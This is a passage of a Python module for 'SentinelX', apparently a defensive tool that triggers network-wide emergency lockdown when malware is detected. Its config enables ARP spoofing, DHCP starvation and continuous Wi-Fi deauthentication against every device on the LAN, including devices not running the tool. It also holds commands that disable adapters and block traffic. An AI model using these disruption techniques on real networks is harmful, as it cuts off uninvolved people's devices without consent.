"""
Network Lockdown & Emergency Response System - Disable network access across all nodes
Allows any node to initiate network-wide emergency lockdown when attack is detected
Implements peer-to-peer and central server coordination for rapid response
Forces network isolation on ALL devices (with/without SentinelX) using multiple techniques
"""
import json
import logging
import subprocess
import threading
import socket
import time
import platform
import os
from pathlib import Path
from typing import List, Dict, Optional, Set
from datetime import datetime
import concurrent.futures

try:
    from http.server import HTTPServer, BaseHTTPRequestHandler
    import http.client
    HTTP_AVAILABLE = True
except ImportError:
    HTTP_AVAILABLE = False

try:
    from scapy.all import ARP, Ether, srp, send, Dot11, Dot11Deauth, sendp
    SCAPY_AVAILABLE = True
    
    # Fix Scapy L3pcapSocket cleanup bug (missing send_socks attribute)
    try:
        from scapy.arch.libpcap import L3pcapSocket
        
        original_close = L3pcapSocket.close
        def patched_close(self):
            """Close socket with proper error handling"""
            try:
                if hasattr(self, 'send_socks'):
                    for fd in self.send_socks.values():
                        try:
                            fd.close()
                        except:
                            pass
                if hasattr(self, 'recv_sock'):
                    try:
                        self.recv_sock.close()
                    except:
                        pass
            except:
                pass
        
        L3pcapSocket.close = patched_close
    except:
        pass
    
    # Check if layer 2 is available on Windows
    try:
        from scapy.arch.windows import get_windows_if_list
        SCAPY_L2_AVAILABLE = True
    except ImportError:
        SCAPY_L2_AVAILABLE = False
except ImportError:
    SCAPY_AVAILABLE = False
    SCAPY_L2_AVAILABLE = False

logger = logging.getLogger(__name__)

# Suppress Scapy warnings about routing and Npcap
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
logging.getLogger("scapy").setLevel(logging.ERROR)


class LockdownAlert:
    """Alert triggered when an attack is detected on any node"""
    
    def __init__(self, source_ip: str, threat_type: str, severity: int = 10, 
                 threat_name: str = None, description: str = None):
        """
        Create a lockdown alert
        
        Args:
            source_ip: IP of the node detecting the attack
            threat_type: Type of threat detected (malware, ransomware, etc.)
            severity: Severity level (1-10)
            threat_name: Name of detected threat
            description: Detailed description
        """
        self.source_ip = source_ip
        self.threat_type = threat_type
        self.severity = severity
        self.threat_name = threat_name or f"Unknown-{threat_type}"
        self.description = description or "Attack detected - initiating emergency lockdown"
        self.timestamp = datetime.now().isoformat()
        self.id = f"{source_ip}-{int(time.time() * 1000)}"
    
    def to_dict(self) -> Dict:
        """Convert alert to dictionary"""
        return {
            "id": self.id,
            "source_ip": self.source_ip,
            "threat_type": self.threat_type,
            "severity": self.severity,
            "threat_name": self.threat_name,
            "description": self.description,
            "timestamp": self.timestamp
        }
    
    def to_json(self) -> str:
        """Convert alert to JSON"""
        return json.dumps(self.to_dict())


class NetworkLockdownManager:
    """
    Coordinates network-wide emergency lockdown when attack is detected.
    Disables network access across all nodes in the network.
    """
    
    def __init__(self, config_dir: Path = None):
        """
        Initialize network lockdown manager
        
        Args:
            config_dir: Configuration directory
        """
        self.config_dir = Path(config_dir) if config_dir else Path.cwd()
        self.config_dir.mkdir(parents=True, exist_ok=True)
        
        self.lockdown_file = self.config_dir / "lockdown_config.json"
        self.lockdown_log_file = self.config_dir / "lockdown_history.json"
        
        self.configuration = self._load_configuration()
        self.lockdown_history = self._load_lockdown_history()
        self.active_lockdown = False
        self.lockdown_reason = None
        self.lockdown_thread = None
        
        # IP tracking for continuous deauthentication
        self.deauthenticated_ips = set()  # All IPs currently being deauth'd
        self.threat_cleared = True  # Flag: threat has been manually cleared
        self.deauth_continuous_mode = False  # Keep deauth running until threat cleared
        
        # CACHED GATEWAY DETECTION (used throughout lockdown to ensure consistency)
        self.cached_gateway_ip = None
        self.cached_local_ip = None
        self.cached_interface = None
    
    def _load_configuration(self) -> Dict:
        """Load lockdown configuration"""
        default_config = {
            "enabled": True,
            "auto_lockdown_on_critical": True,
            "critical_threat_types": ["ransomware", "rootkit", "worm", "trojan_dropper"],
            "minimum_severity_for_lockdown": 8,
            "lockdown_modes": {
                "full": "Disable all network interfaces",
                "partial": "Block outbound connections only",
                "selective": "Block only high-risk ports"
            },
            "current_mode": "full",
            "timeout_minutes": 30,
            "require_manual_confirmation": False,
            "central_server_enabled": False,
            "central_server_ip": None,
            "central_server_port": 8888,
            "peer_notification_enabled": True,
            "recovery_after_lockdown": "manual",
            "universal_lockdown_enabled": True,
            "universal_lockdown_methods": {
                "arp_spoofing": True,
                "dhcp_starvation": True,
                "gateway_blocking": True,
                "mac_filtering": True,
                "deauth_attack": True,
                "network_flooding": False
            },
            "affected_devices": "all"
        }
        
        try:
            if self.lockdown_file.exists():
                with open(self.lockdown_file, 'r') as f:
                    loaded = json.load(f)
                    default_config.update(loaded)
        except Exception as e:
            logger.error(f"Error loading lockdown configuration: {e}")
        
        return default_config
    
    def _load_lockdown_history(self) -> List[Dict]:
        """Load lockdown history"""
        try:
            if self.lockdown_log_file.exists():
                with open(self.lockdown_log_file, 'r') as f:
                    return json.load(f)
        except Exception as e:
            logger.error(f"Error loading lockdown history: {e}")
        
        return []
    
    def _save_configuration(self):
        """Save lockdown configuration"""
        try:
            with open(self.lockdown_file, 'w') as f:
                json.dump(self.configuration, f, indent=2)
        except Exception as e:
            logger.error(f"Error saving lockdown configuration: {e}")
    
    def _save_lockdown_history(self):
        """Save lockdown history"""
        try:
            with open(self.lockdown_log_file, 'w') as f:
                json.dump(self.lockdown_history, f, indent=2)
        except Exception as e:
            logger.error(f"Error saving lockdown history: {e}")
    
    def should_initiate_lockdown(self, threat_type: str, severity: int) -> bool:
        """
        Determine if lockdown should be initiated
        
        Args:
            threat_type: Type of threat
            severity: Severity level (1-10)
            
        Returns:
            True if lockdown should be initiated
        """
        if not self.configuration["enabled"]:
            return False
        
        # Check if critical threat type
        if threat_type in self.configuration["critical_threat_types"]:
            if severity >= self.configuration["minimum_severity_for_lockdown"]:
                return True
        
        # High severity regardless of type
        if severity >= 9:
            return True
        
        return False
    
    def initiate_lockdown(self, alert: LockdownAlert) -> bool:
        """
        Initiate emergency network lockdown
        
        Args:
            alert: LockdownAlert object with threat information
            
        Returns:
            True if lockdown initiated successfully
        """
        # Check if running with admin privileges
        if os.name == 'nt':
            try:
                import ctypes
                is_admin = ctypes.windll.shell32.IsUserAnAdmin()
                if not is_admin:
                    logger.critical("=" * 80)
                    logger.critical("WARNING: NOT RUNNING AS ADMINISTRATOR")
                    logger.critical("=" * 80)
                    logger.critical("Network lockdown requires ADMIN privileges to work!")
                    logger.critical("Please run SentinelX as Administrator for full isolation.")
                    logger.critical("")
                    logger.critical("Without admin, the following will NOT work:")
                    logger.critical("  - Firewall rules (New-NetFirewallRule)")
                    logger.critical("  - Network adapter disable/enable")
                    logger.critical("  - ARP spoofing isolation")
                    logger.critical("  - Gateway IP claiming")
                    logger.critical("  - DHCP starvation")
                    logger.critical("=" * 80)
            except:
                pass
        
        logger.critical("=" * 80)
        logger.critical("EMERGENCY NETWORK LOCKDOWN INITIATING")
        logger.critical("=" * 80)
        logger.critical(f"[LOCKDOWN] Threat: {alert.threat_name}")
        logger.critical(f"[LOCKDOWN] Type: {alert.threat_type}")
        logger.critical(f"[LOCKDOWN] Severity: {alert.severity}/10")
        logger.critical(f"[LOCKDOWN] Source: {alert.source_ip}")
        logger.critical(f"[LOCKDOWN] Description: {alert.description}")
        
        if self.active_lockdown:
            logger.warning("[LOCKDOWN] Already active, skipping")
            return False
        
        # Record in history
        self.lockdown_history.append({
            "timestamp": datetime.now().isoformat(),
            "alert_id": alert.id,
            "source_ip": alert.source_ip,
            "threat_type": alert.threat_type,
            "severity": alert.severity,
            "threat_name": alert.threat_name,
            "mode": self.configuration["current_mode"],
            "status": "initiated"
        })
        self._save_lockdown_history()
        
        self.active_lockdown = True
        self.lockdown_reason = alert.threat_name
        
        # CRITICAL: Notify peer nodes BEFORE disabling network
        logger.critical("[LOCKDOWN] STEP 1: Broadcasting peer node alerts (MUST BE FIRST)")
        self._notify_peer_nodes(alert)
        
        # Allow time for alerts to be sent (broadcast is async with 10 concurrent threads)
        # With 254 hosts and 2-sec timeout each, we need ~50 seconds, but threads complete faster
        # Give it 15 seconds for most nodes to receive alerts
        logger.critical("[LOCKDOWN] Waiting 15 seconds for peer alerts to propagate...")
        import time
        time.sleep(15)
        
        # STEP 2: Notify central server if configured
        logger.critical("[LOCKDOWN] STEP 2: Central server notification")
        if self.configuration["central_server_enabled"]:
            self._notify_central_server(alert)
        
        # STEP 3: Apply network-wide isolation FIRST (while network is active)
        # This MUST happen before local isolation so techniques can send packets
        logger.critical("[LOCKDOWN] STEP 3: Network-wide isolation (ARP, firewall, MAC filtering)")
        self._apply_network_lockdown(self.configuration["current_mode"])
        
        logger.critical("=" * 80)
        logger.critical(f"[LOCKDOWN] COMPLETE - Network isolation active")
        logger.critical(f"[LOCKDOWN] All nodes isolated and contained")
        logger.critical("=" * 80)
        
        return True
    
    def _notify_peer_nodes(self, alert: LockdownAlert):
        """
        Notify peer nodes on the network of the lockdown
        
        Args:
            alert: Lockdown alert
        """
        if not self.configuration["peer_notification_enabled"]:
            logger.warning("Peer notification disabled in configuration")
            return
        
        logger.critical("=" * 70)
        logger.critical("INITIATING PEER NODE NOTIFICATION")
        logger.critical("=" * 70)
        
        # Get local networking info
        try:
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            logger.info(f"[PEER NOTIFY] Local hostname: {hostname}")
            logger.info(f"[PEER NOTIFY] Local IP detected: {local_ip}")
        except Exception as e:
            logger.critical(f"[PEER NOTIFY] FAILED to determine local IP: {e}")
            logger.critical("Peer notification aborted - cannot determine local network info")
            return
        
        # Use CACHED gateway info (detected once at start_continuous_deauth)
        if self.cached_gateway_ip and self.cached_local_ip:
            gateway_ip = self.cached_gateway_ip
            local_ip = self.cached_local_ip
            interface = self.cached_interface
            logger.info(f"[PEER NOTIFY] Using cached gateway: IP={gateway_ip}, Interface={interface}")
        else:
            logger.critical("[PEER NOTIFY] No cached gateway info available")
            return
        
        # Scan for other nodes (simplified - would use network scanner)
        network_range = self._get_network_range(self.cached_local_ip)
        if not network_range:
            logger.critical("[PEER NOTIFY] FAILED to determine network range")
            logger.critical("Peer notification aborted - cannot calculate network range")
            return
        
        logger.critical(f"[PEER NOTIFY] Network range calculated: {network_range}")
        
        # Send notifications in background
        logger.critical(f"[PEER NOTIFY] Starting broadcast thread for {network_range}")
        notification_thread = threading.Thread(
            target=self._broadcast_lockdown_alert, 
            args=(alert, network_range),
            daemon=True
        )
        notification_thread.start()
        logger.critical("[PEER NOTIFY] Broadcast thread started")
    
    def _notify_central_server(self, alert: LockdownAlert):
        """
        Notify central lockdown coordination server
        
        Args:
            alert: Lockdown alert
        """
        if not HTTP_AVAILABLE:
            logger.warning("HTTP not available for central server notification")
            return
        
        try:
            central_ip = self.configuration["central_server_ip"]
            central_port = self.configuration["central_server_port"]
            
            if not central_ip:
                logger.warning("Central server IP not configured")
                return
            
            logger.info(f"Notifying central server at {central_ip}:{central_port}")
            
            conn = http.client.HTTPConnection(central_ip, central_port, timeout=5)
            
            # Send POST request with alert
            headers = {"Content-Type": "application/json"}
            conn.request("POST", "/api/lockdown/alert", alert.to_json(), headers)
            
            response = conn.getresponse()
            if response.status == 200:
                logger.info(f"Central server confirmed receipt of lockdown alert")
            else:
                logger.warning(f"Central server returned status {response.status}")
            
            conn.close()
        except Exception as e:
            logger.error(f"Error notifying central server: {e}")
    
    def _broadcast_lockdown_alert(self, alert: LockdownAlert, network_range: str):
        """
        Broadcast lockdown alert to all nodes in network range
        
        Args:
            alert: Lockdown alert
            network_range: Network CIDR (e.g., 192.168.1.0/24)
        """
        try:
            import ipaddress
            
            network = ipaddress.ip_network(network_range, strict=False)
            logger.critical(f"[BROADCAST] Starting alert broadcast to {network_range}")
            
            # Convert to list to see how many we're sending to
            all_ips = list(network.hosts())
            logger.critical(f"[BROADCAST] Network has ~{len(all_ips)} potential hosts")
            
            def notify_node(ip: str):
                try:
                    logger.debug(f"[BROADCAST] Attempting to reach {ip}:8889...")
                    # Try to establish connection and send alert
                    conn = http.client.HTTPConnection(str(ip), 8889, timeout=2)
                    headers = {"Content-Type": "application/json"}
                    conn.request("POST", "/lockdown/alert", alert.to_json(), headers)
                    response = conn.getresponse()
                    conn.close()
                    
                    if response.status == 200:
                        logger.info(f"[BROADCAST] SUCCESS: {ip} acknowledged alert")
                        return True
                    else:
                        logger.debug(f"[BROADCAST] {ip} returned status {response.status}")
                        return False
                except Exception as e:
                    logger.debug(f"[BROADCAST] Failed to reach {ip}: {type(e).__name__}")
                    return False
            
            # Send to each host on network
            logger.critical(f"[BROADCAST] Dispatching HTTP POST alerts to {len(all_ips)} network hosts (10 parallel)")
            with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
                futures = {executor.submit(notify_node, str(ip)): str(ip) for ip in all_ips}
                
                success_count = 0
                failure_count = 0
                for future in concurrent.futures.as_completed(futures):
                    if future.result():
                        success_count += 1
                    else:
                        failure_count += 1
                
                logger.critical("=" * 70)
                logger.critical(f"[BROADCAST] ALERT BROADCAST COMPLETE")
                logger.critical(f"[BROADCAST]   Successful deliveries: {success_count} nodes")
                logger.critical(f"[BROADCAST]   Failed/No listener: {failure_count} nodes")
                logger.critical(f"[BROADCAST]   Total attempted: {len(all_ips)} hosts in {network_range}")
                
                if success_count > 0:
                    logger.critical(f"[BROADCAST]   >>> {success_count} SentinelX nodes received alert and are isolating")
                else:
                    logger.critical(f"[BROADCAST]   (No SentinelX nodes detected - using universal isolation)")
                
                logger.critical("=" * 70)
        
        except Exception as e:
            logger.critical(f"[BROADCAST] CRITICAL ERROR: {e}")
            import traceback
            logger.debug(traceback.format_exc())
    
    def _apply_local_lockdown(self, mode: str):
        """
        DISABLED - Local lockdown removed to prevent self-isolation
        
        Args:
            mode: Lockdown mode (full, partial, selective)
        """
        logger.info(f"[DISABLED] Local lockdown skipped - only targeting network devices")
        return
    
    def _disable_network_full(self):
        """Disable all network interfaces"""
        try:
            logger.critical("Disabling ALL network interfaces...")
            
            if subprocess.os.name == 'nt':
                # Windows: Disable all network adapters
                logger.info("Windows network shutdown initiated")
                subprocess.run(
                    ["powershell", "-Command", 
                     "Get-NetAdapter | Disable-NetAdapter -Confirm:$false"],
                    capture_output=True,
                    timeout=10
                )
            else:
                # Linux: Bring down all interfaces
                logger.info("Linux network shutdown initiated")
                subprocess.run(["sudo", "ifdown", "-a"], capture_output=True, timeout=10)
            
            logger.critical("Network interfaces have been disabled")
        except Exception as e:
            logger.error(f"Error disabling network: {e}")
    
    def _disable_network_partial(self):
        """Disable outbound network connections only"""
        try:
            logger.critical("Disabling outbound network connections...")
            
            if subprocess.os.name == 'nt':
                # Windows: Add firewall rules to block outbound
                script = """
                $rule = New-NetFirewallRule -DisplayName "Emergency Lockdown - Block Outbound" `
                    -Direction Outbound -Action Block -Enabled True -ErrorAction SilentlyContinue
                Write-Host "Outbound blocked"
                """
                subprocess.run(
                    ["powershell", "-Command", script],
                    capture_output=True,
                    timeout=10
                )
            else:
                # Linux: iptables to block outbound
                subprocess.run(
                    ["sudo", "iptables", "-P", "OUTPUT", "DROP"],
                    capture_output=True,
                    timeout=10
                )
            
            logger.critical("Outbound connections blocked")
        except Exception as e:
            logger.error(f"Error blocking outbound: {e}")
    
    def _disable_network_selective(self):
        """Disable high-risk network ports/services"""
        try:
            logger.critical("Blocking high-risk network ports...")
            
            high_risk_ports = [
                445,  # SMB
                139,  # NetBIOS
                3389, # RDP
                22,   # SSH
                3306, # MySQL
                5432, # PostgreSQL
                27017 # MongoDB
            ]
            
            if subprocess.os.name == 'nt':
                # Windows: Block ports with firewall rules
                for port in high_risk_ports:
                    subprocess.run(
                        ["powershell", "-Command",
                         f"New-NetFirewallRule -DisplayName 'Block-Port-{port}' "
                         f"-Direction Inbound -Action Block -Protocol TCP -LocalPort {port} "
                         f"-ErrorAction SilentlyContinue"],
                        capture_output=True,
                        timeout=5
                    )
            else:
                # Linux: Block ports with iptables
                for port in high_risk_ports:
                    subprocess.run(
                        ["sudo", "iptables", "-A", "INPUT", "-p", "tcp", 
                         "--dport", str(port), "-j", "DROP"],
                        capture_output=True,
                        timeout=5
                    )
            
            logger.critical(f"Blocked {len(high_risk_ports)} high-risk ports")
        except Exception as e:
            logger.error(f"Error selectively blocking: {e}")
    
    def _apply_network_lockdown(self, mode: str):
        """
        Apply lockdown to all nodes on the network
        Uses multiple techniques to force isolation on ALL devices
        
        Args:
            mode: Lockdown mode
        """
        logger.info(f"Initiating network-wide {mode} lockdown...")
        logger.critical("Activating universal network isolation (targets ALL devices)")
        
        if self.configuration.get("universal_lockdown_enabled", True):
            # Apply universal lockdown (affects devices with/without SentinelX)
            self._apply_universal_network_isolation(mode)
        else:
            # Use only peer notification for SentinelX nodes
            logger.critical(f"Broadcasting {mode} lockdown to SentinelX nodes only")
    
    def _get_network_node_count(self) -> int:
        """Get estimated count of nodes on network"""
        # Placeholder - would scan network for actual count
        return 5  # Default estimate
    
    def _get_network_range(self, local_ip: str) -> Optional[str]:
        """Get network range from local IP - auto-detects actual subnet mask from Windows"""
        try:
            import ipaddress
            
            ip = ipaddress.ip_address(local_ip)
            if isinstance(ip, ipaddress.IPv4Address):
                # Try to auto-detect actual subnet mask from Windows
                logger.critical(f"[SUBNET] Detecting subnet mask for {local_ip}...")
                detected_mask = self._detect_subnet_mask_from_ipconfig(local_ip)
                
                # Accept ANY detected mask - even /32 - and try to use it
                if detected_mask:
                    try:
                        # Check if it's /32 - this is probably wrong but not invalid
                        if detected_mask == "255.255.255.255":
                            logger.critical(f"⚠ [SUBNET] Detected /32 mask (255.255.255.255) - this likely indicates misconfiguration")
                            logger.critical(f"⚠ [SUBNET] Will use IP-class fallback since /32 means no other hosts on network")
                        else:
                            # Use the detected mask
                            cidr = ipaddress.IPv4Network(f"0.0.0.0/{detected_mask}").prefixlen
                            network = ipaddress.ip_network(f"{local_ip}/{cidr}", strict=False)
                            logger.critical(f"✓ [SUBNET] Using detected mask: {network} (mask: {detected_mask}, CIDR: /{cidr})")
                            return str(network)
                    except Exception as e:
                        logger.critical(f"✗ [SUBNET] Could not convert mask '{detected_mask}': {e}")
                else:
                    logger.critical(f"⚠ [SUBNET] ipconfig detection returned no mask - trying PowerShell...")
                    ps_mask = self._detect_mask_powershell(local_ip)
                    if ps_mask and ps_mask != "255.255.255.255":
                        try:
                            cidr = ipaddress.IPv4Network(f"0.0.0.0/{ps_mask}").prefixlen
                            network = ipaddress.ip_network(f"{local_ip}/{cidr}", strict=False)
                            logger.critical(f"✓ [SUBNET] PowerShell detected: {network} (mask: {ps_mask})")
                            return str(network)
                        except Exception as e:
                            logger.debug(f"[SUBNET] Could not use PowerShell result: {e}")
                
                logger.critical(f"⚠ [SUBNET] Using IP-class fallback for {local_ip}...")
                
                # Fallback: detect based on IP class/range
                if local_ip.startswith("169.254."):
                    # Link-local: use /16
                    network = ipaddress.ip_network(f"{local_ip}/16", strict=False)
                    logger.critical(f"⚠ [SUBNET] Link-local detected - using /16: {network}")
                    return str(network)
                elif local_ip.startswith("10."):
                    # Class A private: try PowerShell first for /8, /16, /24 detection
                    ps_mask = self._detect_mask_powershell(local_ip)
                    if ps_mask and ps_mask != "255.255.255.255":
                        try:
                            cidr = ipaddress.IPv4Network(f"0.0.0.0/{ps_mask}").prefixlen
                            network = ipaddress.ip_network(f"{local_ip}/{cidr}", strict=False)
                            logger.critical(f"✓ [SUBNET] Class A with PowerShell: {network} (mask: {ps_mask})")
                            return str(network)
                        except:
                            pass
                    # No PowerShell result - use safe default /8 for Class A
                    network = ipaddress.ip_network(f"{local_ip}/8", strict=False)
                    logger.critical(f"⚠ [SUBNET] Class A private (10.x.x.x) - using /8: {network}")
                    return str(network)
                elif local_ip.startswith("172."):
                    # Class B private
                    ps_mask = self._detect_mask_powershell(local_ip)
                    if ps_mask and ps_mask != "255.255.255.255":
                        try:
                            cidr = ipaddress.IPv4Network(f"0.0.0.0/{ps_mask}").prefixlen
                            network = ipaddress.ip_network(f"{local_ip}/{cidr}", strict=False)
                            logger.critical(f"✓ [SUBNET] Class B with PowerShell: {network} (mask: {ps_mask})")
                            return str(network)
                        except:
                            pass
                    network = ipaddress.ip_network(f"{local_ip}/16", strict=False)
                    logger.critical(f"⚠ [SUBNET] Class B private (172.x.x.x) - using /16: {network}")
                    return str(network)
                elif local_ip.startswith("192.168."):
                    # Class C private: Try PowerShell to detect actual /16 vs /24
                    # But if PowerShell fails (which it will for /32 IPs), use /24 as default for 192.168
                    ps_mask = self._detect_mask_powershell(local_ip)
                    if ps_mask and ps_mask != "255.255.255.255":
                        try:
                            cidr = ipaddress.IPv4Network(f"0.0.0.0/{ps_mask}").prefixlen
                            network = ipaddress.ip_network(f"{local_ip}/{cidr}", strict=False)
                            logger.critical(f"✓ [SUBNET] 192.168 with PowerShell: {network} (mask: {ps_mask})")
                            return str(network)
                        except:
                            pass
                    # Default to /24 for 192.168 (most common for Ethernet LANs)
                    network = ipaddress.ip_network(f"{local_ip}/24", strict=False)
                    logger.critical(f"⚠ [SUBNET] 192.168.x.x - using default /24: {network}")
                    return str(network)
                else:
                    # Default to /24 for anything else
                    network = ipaddress.ip_network(f"{local_ip}/24", strict=False)
                    logger.critical(f"⚠ [SUBNET] Using default /24: {network}")
                    return str(network)
                
        except Exception as e:
            logger.debug(f"Error in _get_network_range: {e}")
        return None
    
    def _detect_subnet_mask_from_ipconfig(self, target_ip: str) -> Optional[str]:
        """
        Detect actual subnet mask for target IP using Windows ipconfig command.
        Falls back through multiple parsing strategies.
        
        Args:
            target_ip: The IP address to find the subnet mask for
            
        Returns:
            Subnet mask string (e.g., "255.255.255.0") or None if not found
        """
        try:
            logger.debug(f"[IPCONFIG] Detecting subnet mask for {target_ip}")
            
            # Use ipconfig /all for detailed output
            result = subprocess.run(
                ["ipconfig", "/all"],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            if result.returncode == 0 and result.stdout:
                lines = result.stdout.split('\n')
                logger.debug(f"[IPCONFIG] Got {len(lines)} lines from ipconfig /all")
                
                # Strategy: Look for adapter section, then find IP and corresponding Subnet Mask
                current_adapter = None
                current_ip = None
                found_masks = {}  # Track all IP->mask mappings found
                
                for i, line in enumerate(lines):
                    # Detect adapter section (contains "Adapter", ":", no leading spaces or minimal)
                    if 'Adapter' in line and ':' in line and not line.startswith(' '):
                        current_adapter = line.strip()
                        current_ip = None
                        logger.debug(f"[IPCONFIG] Adapter: {current_adapter}")
                    
                    # Look for IPv4 Address
                    if 'IPv4 Address' in line and ':' in line:
                        try:
                            ip_part = line.split(':')[-1].strip()
                            # Handle parenthetical notation like "192.168.1.1 (Preferred)"
                            if '(' in ip_part:
                                ip_part = ip_part.split('(')[0].strip()
                            current_ip = ip_part
                            logger.debug(f"[IPCONFIG]   IPv4: {current_ip} in {current_adapter}")
                        except Exception as parse_err:
                            logger.debug(f"[IPCONFIG] Parse error on IPv4 line: {parse_err}")
                    
                    # Look for Subnet Mask right after IPv4 Address
                    if 'Subnet Mask' in line and ':' in line and current_ip:
                        try:
                            mask_val = line.split(':')[-1].strip()
                            found_masks[current_ip] = (mask_val, current_adapter)
                            logger.debug(f"[IPCONFIG]   Found mask for {current_ip}: {mask_val}")
                        except Exception as parse_err:
                            logger.debug(f"[IPCONFIG] Parse error on Subnet Mask line: {parse_err}")
                
                logger.critical(f"[IPCONFIG] Found {len(found_masks)} IP addresses with masks:")
                for ip, (mask, adapter) in found_masks.items():
                    logger.critical(f"[IPCONFIG]   {ip} → {mask} (from {adapter})")
                
                # Return mask for our target IP, but skip /32 masks (likely virtual)
                if target_ip in found_masks:
                    mask, adapter = found_masks[target_ip]
                    if mask == "255.255.255.255":
                        logger.critical(f"⚠ [IPCONFIG] Found /32 mask for {target_ip} - likely virtual adapter, skipping")
                        # Check if there are other IPs on the same adapter that might be real
                        for other_ip, (other_mask, other_adapter) in found_masks.items():
                            if other_adapter == adapter and other_mask != "255.255.255.255":
                                logger.critical(f"→ [IPCONFIG] Using alternative IP {other_ip} from same adapter with mask {other_mask}")
                                return other_mask
                        # No better mask found on same adapter
                        return None
                    else:
                        logger.critical(f"✓ [IPCONFIG] Found {target_ip} in {adapter} → mask: {mask}")
                        return mask
                
                logger.critical(f"✗ [IPCONFIG] Target IP {target_ip} not found in {len(found_masks)} discovered addresses")
            else:
                logger.critical(f"✗ [IPCONFIG] Command failed (returncode={result.returncode})")
            
            return None
            
        except Exception as e:
            logger.critical(f"✗ [IPCONFIG] Exception: {e}")
            import traceback
            logger.critical(f"✗ [IPCONFIG] Traceback: {traceback.format_exc()}")
            return None
    
    def _detect_mask_powershell(self, target_ip: str) -> Optional[str]:
        """
        Fallback: Detect subnet mask using PowerShell network interface info via WMI
        
        Args:
            target_ip: IP address to find mask for
            
        Returns:
            Subnet mask (e.g., "255.255.255.0") or None if not found
        """
        try:
            logger.critical(f"[POWERSHELL] Attempting to detect mask for {target_ip}...")
            
            # Try WMI approach which is more reliable
            ps_cmd = f"""
$interfaces = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object {{ $_.IPAddress -contains '{target_ip}' }}
if ($interfaces) {{
  $iface = $interfaces[0]
  @{{
    IP = '{target_ip}'
    Mask = $iface.IPSubnet[0]
  }} | ConvertTo-Json
}}
"""
            result = subprocess.run(
                ["powershell", "-NoProfile", "-Command", ps_cmd],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            if result.returncode == 0 and result.stdout.strip():
                try:
                    import json
                    data = json.loads(result.stdout)
                    mask = data.get('Mask', '')
                    if mask and mask != "255.255.255.255":
                        logger.critical(f"✓ [POWERSHELL] Found {target_ip} → mask: {mask}")
                        return mask
                    elif mask == "255.255.255.255":
                        logger.critical(f"⚠ [POWERSHELL] Found /32 mask - likely duplicate/APIPA IP")
                except Exception as json_err:
                    logger.debug(f"[POWERSHELL] JSON parse error: {json_err}")
                    logger.debug(f"[POWERSHELL] Raw output: {result.stdout}")
            
            logger.debug(f"[POWERSHELL] Could not detect mask via WMI for {target_ip}")
            return None
            
        except Exception as e:
            logger.debug(f"[POWERSHELL] Exception: {e}")
            return None
    
    def _get_scapy_interface_for_adapter(self, windows_adapter_name: str) -> Optional[str]:
        """
        Map Windows adapter name to Scapy/Npcap interface GUID
        
        Args:
            windows_adapter_name: Windows adapter name (e.g., "Ethernet", "Wi-Fi")
            
        Returns:
            Scapy interface name (e.g., \\Device\\NPF_{GUID}) or None
        """
        try:
            from scapy.all import get_if_list, get_if_hwaddr
            import subprocess
            
            logger.debug(f"[SCAPY] Mapping adapter '{windows_adapter_name}' to Npcap interface...")
            
            # Get MAC address of the Windows adapter
            ps_cmd = f"""
Get-NetAdapter -Name '{windows_adapter_name}' | Select-Object -ExpandProperty MacAddress
"""
            result = subprocess.run(
                ["powershell", "-NoProfile", "-Command", ps_cmd],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            if result.returncode != 0 or not result.stdout.strip():
                logger.debug(f"[SCAPY] Could not get MAC for adapter '{windows_adapter_name}'")
                return None
            
            adapter_mac = result.stdout.strip().lower()
            logger.debug(f"[SCAPY] Adapter '{windows_adapter_name}' MAC: {adapter_mac}")
            
            # Find matching Scapy interface by MAC address
            for scapy_iface in get_if_list():
                try:
                    iface_mac = get_if_hwaddr(scapy_iface).lower()
                    if iface_mac == adapter_mac:
                        logger.critical(f"✓ [SCAPY] Mapped '{windows_adapter_name}' → {scapy_iface}")
                        return scapy_iface
                except Exception as e:
                    logger.debug(f"[SCAPY] Error checking interface {scapy_iface}: {e}")
            
            logger.warning(f"⚠ [SCAPY] Could not find Npcap interface for adapter '{windows_adapter_name}' with MAC {adapter_mac}")
            return None
            
        except Exception as e:
            logger.debug(f"[SCAPY] Exception in adapter mapping: {e}")
            return None
    
    
    def start_continuous_deauth(self, threat_name: str = "Unknown Threat"):
        """
        Start continuous deauthentication mode - keeps attack running until threat is cleared
        
        Args:
            threat_name: Name of the threat
            
        Returns:
            True if started successfully
        """
        logger.critical(f"Starting CONTINUOUS DEAUTHENTICATION mode for threat: {threat_name}")
        logger.critical("All devices will be continuously deauthenticated until threat is manually cleared")
        
        # IMPORTANT: Detect gateway ONCE and cache it for entire lockdown
        self.cached_gateway_ip, self.cached_local_ip, self.cached_interface = self._get_network_gateway()
        if not self.cached_gateway_ip or not self.cached_local_ip:
            logger.critical("Failed to detect gateway/local IP - cannot start lockdown")
            return False
        
        logger.info(f"✓ Cached gateway detection: Gateway={self.cached_gateway_ip}, Local IP={self.cached_local_ip}, Interface={self.cached_interface}")
        
        self.deauth_continuous_mode = True
        self.threat_cleared = False
        self.deauthenticated_ips.clear()
        
        # Run lockdown in background with continuous deauth
        alert = LockdownAlert(
            source_ip='127.0.0.1',
            threat_type='continuous_threat',
            severity=10,
            threat_name=threat_name,
            description=f'Continuous deauthentication until threat cleared'
        )
        
        # Start lockdown in background thread
        self.lockdown_thread = threading.Thread(
            target=self.initiate_lockdown,
            args=(alert,),
            daemon=False
        )
        self.lockdown_thread.start()
        
        logger.critical(f"Continuous deauth mode ACTIVE - Threat: {threat_name}")
        return True
    
    def clear_threat_and_release(self) -> bool:
        """
        Clear the threat and release continuous deauthentication
        Stops deauth attack and restores network connectivity
        
        Returns:
            True if successfully cleared and released
        """
        logger.critical("THREAT CLEARED - Releasing continuous deauthentication")
        logger.critical(f"IPs that were deauthenticated: {len(self.deauthenticated_ips)} devices")
        
        if self.deauthenticated_ips:
            logger.critical(f"Deauth target list: {', '.join(sorted(self.deauthenticated_ips))}")
        
        # CRITICAL: Set flags FIRST to stop attack loops immediately
        self.threat_cleared = True  # This stops the while loop: (deauth_continuous_mode and not threat_cleared)
        self.deauth_continuous_mode = False  # Also stop continuous mode
        self.active_lockdown = False  # Stop any other lockdown
        
        logger.critical("Attack loop stop flags set - waiting for threads to exit...")
        
        # Give attack threads a moment to exit gracefully
        import time
        time.sleep(0.5)
        
